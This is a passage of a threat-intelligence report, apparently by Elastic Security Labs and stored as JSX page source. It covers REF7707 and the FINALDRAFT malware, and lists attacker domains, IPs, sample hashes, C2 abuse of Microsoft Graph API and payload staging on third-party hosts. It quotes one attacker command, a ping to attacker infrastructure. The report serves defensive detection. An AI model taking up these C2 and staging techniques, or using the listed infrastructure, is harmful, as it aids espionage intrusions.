ports \",(0,i.jsx)(e.code,{children:\"80\"}),\" and \",(0,i.jsx)(e.code,{children:\"443\"}),\". The string \\u201C\",(0,i.jsx)(e.code,{children:\"hobiter[.]com\"}),\"\\u201D is associated with the TLS certificate on port \",(0,i.jsx)(e.code,{children:\"443\"}),\". A Censys query pivot on the service banner hash of this port yields six additional servers that share that hash (seven total).\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"IP\"}),(0,i.jsx)(e.th,{children:\"TLS Cert names\"}),(0,i.jsx)(e.th,{children:\"Cert CN\"}),(0,i.jsx)(e.th,{children:\"ports\"}),(0,i.jsx)(e.th,{children:\"ASN\"}),(0,i.jsx)(e.th,{children:\"GEO\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"47.83.8.198\"})}),(0,i.jsx)(e.td,{children:\"*.hobiter[.]com\"}),(0,i.jsx)(e.td,{children:\"CloudFlare Origin Certificate\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"80\"}),\", \",(0,i.jsx)(e.code,{children:\"443\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45102\"})}),(0,i.jsx)(e.td,{children:\"Hong Kong\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"8.218.153.45\"})}),(0,i.jsx)(e.td,{children:\"*.autodiscovar[.]com\"}),(0,i.jsx)(e.td,{children:\"CloudFlare Origin Certificate\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"53\"}),\", \",(0,i.jsx)(e.code,{children:\"443\"}),\", \",(0,i.jsx)(e.code,{children:\"2365\"}),\", \",(0,i.jsx)(e.code,{children:\"3389\"}),\", \",(0,i.jsx)(e.code,{children:\"80\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45102\"})}),(0,i.jsx)(e.td,{children:\"Hong Kong\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45.91.133.254\"})}),(0,i.jsx)(e.td,{children:\"*.vm-clouds[.]net\"}),(0,i.jsx)(e.td,{children:\"CloudFlare Origin Certificate\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"443\"}),\", \",(0,i.jsx)(e.code,{children:\"3389\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"56309\"})}),(0,i.jsx)(e.td,{children:\"Nonthaburi, Thailand\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"8.213.217.182\"})}),(0,i.jsx)(e.td,{children:\"*.ictnsc[.]com\"}),(0,i.jsx)(e.td,{children:\"CloudFlare Origin Certificate\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"53\"}),\", \",(0,i.jsx)(e.code,{children:\"443\"}),\", \",(0,i.jsx)(e.code,{children:\"3389\"}),\", \",(0,i.jsx)(e.code,{children:\"80\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45102\"})}),(0,i.jsx)(e.td,{children:\"Bangkok, Thailand\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"47.239.0.216\"})}),(0,i.jsx)(e.td,{children:\"*.d-links[.]net\"}),(0,i.jsx)(e.td,{children:\"CloudFlare Origin Certificate\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"80\"}),\", \",(0,i.jsx)(e.code,{children:\"443\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45102\"})}),(0,i.jsx)(e.td,{children:\"Hong Kong\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"203.232.112.186\"})}),(0,i.jsx)(e.td,{children:\"[NONE]\"}),(0,i.jsx)(e.td,{children:\"[NONE]\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"80\"}),\", \",(0,i.jsx)(e.code,{children:\"5357\"}),\", \",(0,i.jsx)(e.code,{children:\"5432\"}),\", \",(0,i.jsx)(e.code,{children:\"5985\"}),\", \",(0,i.jsx)(e.code,{children:\"8000\"}),\", \",(0,i.jsx)(e.code,{children:\"8080\"}),\", \",(0,i.jsx)(e.code,{children:\"9090\"}),\", \",(0,i.jsx)(e.code,{children:\"15701\"}),\", \",(0,i.jsx)(e.code,{children:\"15702\"}),\", \",(0,i.jsx)(e.code,{children:\"15703\"}),\", \",(0,i.jsx)(e.code,{children:\"33990\"}),\" \",(0,i.jsx)(e.code,{children:\"47001\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"4766\"})}),(0,i.jsx)(e.td,{children:\"Daejeon, South Korea\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"13.125.236.162\"})}),(0,i.jsx)(e.td,{children:\"[NONE]\"}),(0,i.jsx)(e.td,{children:\"[NONE]\"}),(0,i.jsxs)(e.td,{children:[(0,i.jsx)(e.code,{children:\"80\"}),\", \",(0,i.jsx)(e.code,{children:\"3389\"}),\", \",(0,i.jsx)(e.code,{children:\"8000\"}),\", \",(0,i.jsx)(e.code,{children:\"15111\"}),\", \",(0,i.jsx)(e.code,{children:\"15709\"}),\", \",(0,i.jsx)(e.code,{children:\"19000\"})]}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"16509\"})}),(0,i.jsx)(e.td,{children:\"Incheon, South Korea\"})]})]})]})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Two servers (\",(0,i.jsx)(e.code,{children:\"203.232.112[.]186\"}),\" and \",(0,i.jsx)(e.code,{children:\"13.125.236[.]162\"}),\") do not share the same profile as the other five. While the service banner hash still matches, it is not on port \",(0,i.jsx)(e.code,{children:\"443\"}),\", but on ports \",(0,i.jsx)(e.code,{children:\"15701\"}),\",\",(0,i.jsx)(e.code,{children:\" 15702\"}),\", \",(0,i.jsx)(e.code,{children:\"15703\"}),\", and \",(0,i.jsx)(e.code,{children:\"15709\"}),\". Further, the ports in question do not appear to support TLS communications. We have not attributed them to REF7707 with a high degree of confidence but are including them for completeness.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The other five servers, including the original \\u201Chobiter\\u201D server, share several similarities:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Service banner hash match on port \",(0,i.jsx)(e.code,{children:\"443\"})]}),`\n`,(0,i.jsx)(e.li,{children:\"Southeast Asia geolocations\"}),`\n`,(0,i.jsx)(e.li,{children:\"Windows OS\"}),`\n`,(0,i.jsx)(e.li,{children:\"Cloudflare issued TLS certs\"}),`\n`,(0,i.jsx)(e.li,{children:\"Most have the same ASN belonging to Alibaba\"}),`\n`]}),`\n`,(0,i.jsx)(e.h4,{id:\"hobiter-and-vmphere\",children:\"Hobiter and VMphere\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"update.hobiter[.]com\"}),\" and\",(0,i.jsx)(e.code,{children:\" support.vmphere[.]com\"}),\" were found in an ELF binary (\",(0,i.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9\",rel:\"nofollow\",children:\"biosets.rar\"}),\") from December 13, 2024. Both domains were registered over a year earlier, on September 12, 2023. This ELF binary features similar C2 versatility and a partial reimplementation of the commands available in the Windows version of FINALDRAFT.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"A name server lookup of \",(0,i.jsx)(e.code,{children:\"hobiter[.]com\"}),\" and \",(0,i.jsx)(e.code,{children:\"vmphere[.]com\"}),\" yields only a Cloudflare name server record for each and no A records. Searching for their known subdomains provides us with A records pointing to Cloudflare-owned IP addresses.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"ictnsc\",children:\"ICTNSC\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"ictnsc[.]com\"}),\" is directly associated with the REF7707 intrusion above from a connectivity check (\",(0,i.jsx)(e.code,{children:\"ping digert.ictnsc[.]com\"}),\") performed by the attackers. The server associated with this domain (\",(0,i.jsx)(e.code,{children:\"8.213.217[.]182\"}),\") was identified through the Censys service banner hash on the HTTPS service outlined above. Like the other identified infrastructure, the subdomain resolves to Cloudflare-owned IP addresses, and the parent domain only has a Cloudflare NS record. \",(0,i.jsx)(e.code,{children:\"ictnsc[.]com\"}),\" was registered on February 8, 2023.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"While we cannot confirm the association as malicious, it should be noted that the domain \",(0,i.jsx)(e.code,{children:\"ict.nsc[.]ru\"}),\" is the Federal Research Center for Information and Computational Technologies web property, often referred to as the FRC or the ICT. This Russian organization conducts research in various areas like computer modeling, software engineering, data processing, artificial intelligence, and high-performance computing.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"While not observed in the REF7707 intrusion, the domain we observed (\",(0,i.jsx)(e.code,{children:\"ictnsc[.]com\"}),\") has an \",(0,i.jsx)(e.code,{children:\"ict\"}),\" subdomain (\",(0,i.jsx)(e.code,{children:\"ict.ictnsc[.]com\"}),\"), which is strikingly similar to \",(0,i.jsx)(e.code,{children:\"ict.nsc[.]ru\"}),\". Again, we cannot confirm if they are related to the legitimate FRC or ITC, it seems the threat actor intended for the domains to be similar, conflated, or confused with each other.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"autodiscovar\",children:\"Autodiscovar\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"Autodiscovar[.]com\"}),\" has not been directly associated with any FINALDRAFT malware. It has been indirectly associated with REF7707 infrastructure through pivots on web infrastructure identifiers. The parent domain only has a Cloudflare NS record. A subdomain \",(0,i.jsx)(e.a,{href:\"https://www.virustotal.com/gui/domain/autodiscovar.com/relations\",rel:\"nofollow\",children:\"identified through VirusTotal\"}),\" (\",(0,i.jsx)(e.code,{children:\"cloud.autodiscovar[.]com\"}),\") points to Cloudflare-owned IP addresses. This domain name resembles other FINALDRAFT and REF7707 web infrastructure and shares the HTTPS service banner hash. This domain was registered on August 26, 2022.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"d-links-and-vm-clouds\",children:\"D-links and VM-clouds\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"d-links[.]net\"}),\" and \",(0,i.jsx)(e.code,{children:\"vm-clouds[.]net\"}),\" were both registered on September 12, 2023, the same day as \",(0,i.jsx)(e.code,{children:\"hobiter[.]com\"}),\" and \",(0,i.jsx)(e.code,{children:\"vmphere[.]com\"}),\". The servers hosting these sites also share the same HTTPS service banner hash. They are not directly associated with the FINALDRAFT malware nor have current routable subdomains, though \",(0,i.jsx)(e.code,{children:\"pol.vm-clouds[.]net\"}),\" was previously registered.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"fortineat\",children:\"Fortineat\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"}),\" was hard-coded in the PATHLOADER sample (\",(0,i.jsx)(e.code,{children:\"dwn.exe\"}),\"). During our analysis of the domain, we discovered that it was not currently registered. To identify any other samples communicating with the domain, our team registered this domain and configured a web server to listen for incoming connections.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"We recorded connection attempts over port \",(0,i.jsx)(e.code,{children:\"443\"}),\", where we identified a specific incoming byte pattern. The connections were sourced from eight different telecommunications and Internet infrastructure companies in Southeast Asia, indicating possible victims of the REF7707 intrusion set.\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"checkponit\",children:\"Checkponit\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"}),\" was observed in four GUIDLOADER samples and a PATHLOADER sample between May and July 2023, and it was used to host the FINALDRAFT encrypted shellcode. The \",(0,i.jsx)(e.code,{children:\"checkponit[.]com\"}),\" registration was created on August 26, 2022. There are currently no A records for \",(0,i.jsx)(e.code,{children:\"checkponit[.]com\"}),\" or \",(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"}),\".\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"third-party-infrastructure\",children:\"Third-party infrastructure\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Microsoft\\u2019s \",(0,i.jsx)(e.code,{children:\"graph.microsoft[.]com\"}),\" is used by the FINALDRAFT PE and ELF variants for command and control via the Graph API. This service is ubiquitous and used for critical business processes of enterprises using Office 365. Defenders are highly encouraged to NOT block-list this domain unless business ramifications are understood.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Google\\u2019s Firebase service (\",(0,i.jsx)(e.code,{children:\"firebasestorage.googleapis[.]com\"}),\"), Pastebin (\",(0,i.jsx)(e.code,{children:\"pastebin[.]com\"}),\"), and a Southeast Asian University are third-party services used to host the encrypted payload for the loaders (PATHLOADER and GUIDLOADER) to download and decrypt the last stage of FINALDRAFT.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"ref7707-timeline\",children:\"REF7707 timeline\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/fragile-web-ref7707/image6.png\",alt:\"REF7707 timeline\",title:\"FINALDRAFT timeline\",width:\"960\",height:\"540\"})}),`\n`,(0,i.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,i.jsx)(e.p,{children:\"REF7707 was discovered while investigating an intrusion of a South American nation's Foreign Ministry.\"}),`\n`,(0,i.jsx)(e.p,{children:\"The investigation revealed novel malware like FINALDRAFT and its various loaders. These tools were deployed and supported using built-in operating system features that are difficult for traditional anti-malware tools to detect.\"}),`\n`,(0,i.jsx)(e.p,{children:\"FINALDRAFT co-opts Microsoft\\u2019s graph API service for command and control to minimize malicious indicators that would be observable to traditional network-based intrusion detection and prevention systems. Third-party hosting platforms for encrypted payload staging also challenge these systems early in the infection chain.\"}),`\n`,(0,i.jsx)(e.p,{children:\"An overview of the VirusTotal submitters and pivots using the indicators in this report shows a relatively heavy geographic presence in Southeast Asia and South America. SIESTAGRAPH, similarly, was the first in-the-wild graph API abuse we had observed, and it (REF2924) involved an attack on a Southeast Asian nation\\u2019s Foreign Ministry.\"}),`\n`,(0,i.jsx)(e.p,{children:\"At Elastic Security Labs, we champion defensive capabilities across infosec domains operated by knowledgeable professionals to mitigate advanced threats best.\"}),`\n`,(0,i.jsx)(e.h2,{id:\"ref7707-through-mitre-attck\",children:\"REF7707 through MITRE ATT\u0026CK\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic uses the \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/\",rel:\"nofollow\",children:\"MITRE ATT\u0026CK\"}),\" framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0043/\",rel:\"nofollow\",children:\"Reconnaissance\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0002\",rel:\"nofollow\",children:\"Execution\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0003\",rel:\"nofollow\",children:\"Persistence\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0004\",rel:\"nofollow\",children:\"Privilege Escalation\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0005\",rel:\"nofollow\",children:\"Defense Evasion\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0006\",rel:\"nofollow\",children:\"Credential Access\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0007\",rel:\"nofollow\",children:\"Discovery\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0008\",rel:\"nofollow\",children:\"Lateral Movement\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0009\",rel:\"nofollow\",children:\"Collection\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0011\",rel:\"nofollow\",children:\"Command and Control\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/tactics/TA0010\",rel:\"nofollow\",children:\"Exfiltration\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"detecting-ref7707\",children:\"Detecting REF7707\"}),`\n`,(0,i.jsx)(e.h3,{id:\"yara\",children:\"YARA\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"FINALDRAFT (Windows)\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Linux_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"FINALDRAFT (Linux)\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Multi_Trojan_FinalDraft.yar\",rel:\"nofollow\",children:\"FINALDRAFT (Multi-OS)\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_PathLoader.yar\",rel:\"nofollow\",children:\"PATHLOADER\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_GuidLoader.yar\",rel:\"nofollow\",children:\"GUIDLOADER\"})}),`\n`]}),`\n`,(0,i.jsx)(e.h2,{id:\"observations\",children:\"Observations\"}),`\n`,(0,i.jsx)(e.p,{children:\"The following observables were discussed in this research.\"}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Observable\"}),(0,i.jsx)(e.th,{children:\"Type\"}),(0,i.jsx)(e.th,{children:\"Name\"}),(0,i.jsx)(e.th,{children:\"Reference\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"39e85de1b1121dc38a33eca97c41dbd9210124162c6d669d28480c833e059530\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"Session.x64.dll\"})}),(0,i.jsx)(e.td,{children:\"FINALDRAFT\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"pfman\"})}),(0,i.jsx)(e.td,{children:\"FINALDRAFT ELF\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"f45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"biosets.rar\"})}),(0,i.jsx)(e.td,{children:\"FINALDRAFT ELF\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"9a11d6fcf76583f7f70ff55297fb550fed774b61f35ee2edd95cf6f959853bcf\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"dwn.exe\"})}),(0,i.jsx)(e.td,{children:\"PATHLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"41a3a518cc8abad677bb2723e05e2f052509a6f33ea75f32bd6603c96b721081\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"5.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"d9fc1cab72d857b1e4852d414862ed8eab1d42960c1fd643985d352c148a6461\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"7.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"f29779049f1fc2d45e43d866a845c45dc9aed6c2d9bbf99a8b1bdacfac2d52f2\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"8.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"17b2c6723c11348ab438891bc52d0b29f38fc435c6ba091d4464f9f2a1b926e0\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"3.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"20508edac0ca872b7977d1d2b04425aaa999ecf0b8d362c0400abb58bd686f92\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"1.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"33f3a8ef2c5fbd45030385b634e40eaa264acbaeb7be851cbf04b62bbe575e75\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"1.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"41141e3bdde2a7aebf329ec546745149144eff584b7fe878da7a2ad8391017b9\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"11.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"49e383ab6d092ba40e12a255e37ba7997f26239f82bebcd28efaa428254d30e1\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"2.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"5e3dbfd543909ff09e343339e4e64f78c874641b4fe9d68367c4d1024fe79249\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"4.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"7cd14d3e564a68434e3b705db41bddeb51dbb7d5425fd901c5ec904dbb7b6af0\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"1.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"842d6ddb7b26fdb1656235293ebf77c683608f8f312ed917074b30fbd5e8b43d\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"2.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"f90420847e1f2378ac8c52463038724533a9183f02ce9ad025a6a10fd4327f12\"})}),(0,i.jsx)(e.td,{children:\"SHA-256\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"6.exe\"})}),(0,i.jsx)(e.td,{children:\"GUIDLOADER\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"poster.checkponit[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"support.fortineat[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"update.hobiter[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"support.vmphere[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"cloud.autodiscovar[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"digert.ictnsc[.]com\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"d-links[.]net\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"vm-clouds[.]net\"})}),(0,i.jsx)(e.td,{children:\"domain-name\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"47.83.8[.]198\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"8.218.153[.]45\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"45.91.133[.]254\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 infrastructure\"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:(0,i.jsx)(e.code,{children:\"8.213.217[.]182\"})}),(0,i.jsx)(e.td,{children:\"ipv4-addr\"}),(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:\"REF7707 